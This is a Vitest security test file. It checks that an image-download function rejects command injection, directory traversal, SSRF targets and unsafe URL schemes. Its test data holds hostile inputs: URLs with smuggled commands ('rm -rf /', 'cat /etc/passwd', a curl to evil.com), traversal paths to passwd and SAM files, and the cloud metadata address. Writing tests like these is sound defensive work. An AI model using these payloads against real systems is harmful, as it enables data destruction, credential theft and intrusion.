import { describe, test, expect } from 'vitest';
import { downloadImage } from '../../src/api.js';

describe('Security Vulnerability Fixes', () => {
  const testDir = './tests/fixtures/downloads';

  describe('Command Injection Prevention', () => {
    test('should reject URLs with command injection attempts', async () => {
      const maliciousUrls = [
        'http://example.com/image.jpg"; rm -rf /; #',
        'http://example.com/image.jpg && cat /etc/passwd',
        'http://example.com/image.jpg; curl http://evil.com/steal',
        'http://example.com/image.jpg`whoami`'
      ];

      for (const url of maliciousUrls) {
        await expect(
          downloadImage(url, testDir, 'test.jpg')
        ).rejects.toThrow();
      }
    });
  });

  describe('Path Traversal Prevention', () => {
    test('should reject filenames with directory traversal attempts', async () => {
      const maliciousFilenames = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '../test.jpg',
        '../../sensitive.txt',
        './../../config.json'
      ];

      for (const filename of maliciousFilenames) {
        await expect(
          downloadImage('https://httpbin.org/image/jpeg', testDir, filename)
        ).rejects.toThrow();
      }
    });

    test('should allow safe filenames with sanitization', async () => {
      // This should not throw, but should sanitize the filename
      const sanitizedTest = async () => {
        try {
          // Test with filename that has special characters but no directory traversal
          await downloadImage('https://httpbin.org/image/jpeg', testDir, 'test:image?.jpg');
          return true;
        } catch (error: any) {
          // Even if it fails due to network, it should not be due to path issues
          return !error.message.includes('directory traversal') && !error.message.includes('Invalid file path');
        }
      };

      expect(await sanitizedTest()).toBe(true);
    });
  });

  describe('SSRF Prevention', () => {
    test('should reject internal network URLs', async () => {
      const internalUrls = [
        'http://localhost:22',
        'http://127.0.0.1:8080',
        'http://192.168.1.1/admin',
        'http://10.0.0.1/config',
        'http://172.16.0.1/internal',
        'http://169.254.169.254/latest/meta-data/' // AWS metadata
      ];

      for (const url of internalUrls) {
        await expect(
          downloadImage(url, testDir, 'test.jpg')
        ).rejects.toThrow('Invalid or unsafe URL');
      }
    });

    test('should reject non-HTTP protocols', async () => {
      const unsafeUrls = [
        'file:///etc/passwd',
        'ftp://example.com/file.jpg',
        'gopher://example.com/file',
        'ldap://example.com/search',
        'javascript:alert(1)'
      ];

      for (const url of unsafeUrls) {
        await expect(
          downloadImage(url, testDir, 'test.jpg')
        ).rejects.toThrow('Invalid or unsafe URL');
      }
    });

    test('should allow safe external URLs', async () => {
      const safeUrls = [
        'https://httpbin.org/image/jpeg',
        'http://example.com/image.jpg',
        'https://picsum.photos/200/300'
      ];

      for (const url of safeUrls) {
        // This test verifies that safe URLs pass validation
        // (even if they fail later due to network issues, they should not fail at validation)
        try {
          await downloadImage(url, testDir, 'safe-test.jpg');
        } catch (error: any) {
          // Network errors are acceptable, validation errors are not
          expect(error.message).not.toBe('Invalid or unsafe URL');
        }
      }
    });
  });

  describe('Error Handling Improvements', () => {
    test('should handle network errors gracefully', async () => {
      await expect(
        downloadImage('https://this-domain-definitely-does-not-exist-12345.com/image.jpg', testDir, 'test.jpg')
      ).rejects.toThrow();
    });

    test('should handle invalid URLs gracefully', async () => {
      await expect(
        downloadImage('not-a-url', testDir, 'test.jpg')
      ).rejects.toThrow('Invalid or unsafe URL');
    });
  });
});